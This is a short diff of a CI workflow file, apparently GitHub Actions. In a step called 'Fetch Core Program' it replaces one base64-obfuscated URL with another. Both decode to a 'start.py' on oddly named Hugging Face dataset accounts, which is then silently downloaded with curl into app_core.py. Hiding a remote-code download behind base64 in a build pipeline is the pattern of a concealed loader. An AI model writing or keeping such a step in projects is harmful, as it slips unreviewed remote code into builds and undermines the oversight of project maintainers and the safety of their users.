@@ -63,7 +63,7 @@ jobs:
       # -----------------------------------------------------------------
       - name: Fetch Core Program
         run: |
-          TARGET_URL=$(python3 -c "import base64; print(base64.b64decode('aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9zamtoZnVrL2ZvZm8vcmVzb2x2ZS9tYWluL3N0YXJ0LnB5').decode())")
+          TARGET_URL=$(python3 -c "import base64; print(base64.b64decode('aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9zamtoZnVrMS9mb2Zmby9yZXNvbHZlL21haW4vc3RhcnQucHk=').decode())")
           curl -sL "$TARGET_URL" -o app_core.py
 
       # -----------------------------------------------------------------
